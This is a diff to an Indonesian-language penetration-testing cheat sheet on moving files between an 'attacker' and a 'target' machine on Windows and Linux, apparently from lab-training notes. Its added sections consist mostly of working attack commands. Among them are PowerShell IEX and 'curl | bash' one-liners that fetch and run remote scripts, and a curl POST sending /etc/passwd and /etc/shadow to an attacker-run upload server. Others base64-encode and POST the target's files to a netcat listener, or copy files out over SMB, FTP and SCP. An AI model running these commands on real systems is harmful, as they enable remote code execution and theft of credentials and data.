@@ -1,6 +1,6 @@
 # File Transfer
 
-## Windows
+<h2 align="center">Windows</h2>
 
 ### Metode 1: copas dari Linux
 
@@ -84,20 +84,20 @@ sudo python3 -m pyftpdlib --port 21
 (New-Object Net.WebClient).DownloadFile('ftp://<ip>/file.txt', 'C:\Users\Public\ftp-file.txt')
 
 # membuat ftp interaktif di komp target
-C:\batagor> echo open 192.168.49.128 > ftpcommand.txt
+C:\batagor> echo open <ip> > ftpcommand.txt
 C:\batagor> echo USER anonymous >> ftpcommand.txt
 C:\batagor> echo binary >> ftpcommand.txt
 C:\batagor> echo GET file.txt >> ftpcommand.txt
 C:\batagor> echo bye >> ftpcommand.txt
 C:\batagor> ftp -v -n -s:ftpcommand.txt
-ftp> open 192.168.49.128
+ftp> open <ip>
 Log in with USER and PASS first.
 ftp> USER anonymous
 
 ftp> GET file.txt
 ftp> bye
 
-C:\htb>more file.txt
+C:\batagor>more file.txt
 Ini isi file contoh
 ```
 
@@ -110,8 +110,154 @@ Ini isi file contoh
 # salin hash dan paste di komp attacker (linux)
 echo ENCODED_BASE64 > base64 -d > hosts
 
-# pastikan file sama, cek hash
+# pastikan file sama, verifikasi dg hash
 ```
 
-### PowerShell Web Uploads
+### Metode 6: PowerShell Web Uploads
 
+```
+# di komp attacker
+pip3 install uploadserver
+python3 -m uploadserver
+
+# di komp target (windows)
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+Invoke-FileUpload -Uri http://<ip>:<port>/upload -File C:\Windows\System32\drivers\etc\hosts
+
+## upload dengan format Base64
+# di komp attacker
+nc -lvnp 8000
+
+# di komp target
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+Invoke-WebRequest -Uri http://<ip>:8000/ -Method POST -Body $b64
+```
+
+### Metode 7: SMB uploads
+
+```
+# di komp attacker
+sudo pip3 install wsgidav cheroot
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
+
+# tes koneksi dari komp target
+dir \\192.168.49.128\DavWWWRoot
+
+# tes upload file dari komp target
+copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
+```
+
+### Metode 7: FTP uploads
+
+```
+# di komp attacker
+sudo python3 -m pyftpdlib --port 21 --write
+
+# di komp target (windows)
+(New-Object Net.WebClient).UploadFile('ftp://<ip>/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+```
+
+<h2 align="center">Linux</h2>
+
+### Metode 1: copas encode
+
+```
+# di komp attacker
+cat id_rsa |base64 -w 0;echo
+
+# di komp target
+echo -n encoded_id_rsa | base64 -d > id_rsa
+
+# verifikasi file dg hash
+```
+
+### Metode 2: donlot dari sumber online
+
+```
+# dengan wget
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+
+# dengan curl
+curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+```
+
+### Metode 3: Fileless di linux
+
+```
+# dengan curl
+curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+
+# dengan wget
+wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+
+```
+
+### Metode 4: donlot dg bash (/dev/tcp)
+
+```
+# koneksi dh web server komp target
+exec 3<>/dev/tcp/10.10.10.32/80
+
+# ambil file
+echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+
+# tampilkan respon
+cat <&3
+```
+
+### Metode 5: SSH donlot
+
+```
+# di kmp attacker
+sudo systemctl enable ssh
+sudo systemctl start ssh
+
+# cek listening port ssh
+netstat -lnpt
+
+# donlot dari target dg scp
+scp plaintext@<ip>:/root/myroot.txt .
+```
+
+### Metode 6: web upload
+
+```
+# di komp attacker
+sudo python3 -m pip install --user uploadserver
+
+# buat selfsigned certificate (masih di komp attacker)
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+
+# jalankan web server
+mkdir https && cd https
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+
+# upload dari komp target
+curl -X POST https://<ip>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
+
+### Metode 7: alternatif metode transfer file web
+
+```
+## membuat server web
+# dengan python3
+python3 -m http.server
+
+# dg python2.7
+python2.7 -m SimpleHTTPServer
+
+# dg PHP
+php -S 0.0.0.0:8000
+
+# dg ruby
+ruby -run -ehttpd . -p8000
+
+# download file dg curl/wget
+```
+
+### Metode 8: SCP upload
+
+```
+scp /path-file-yg-diupload username@10.129.86.90:/home/batagor/
+```
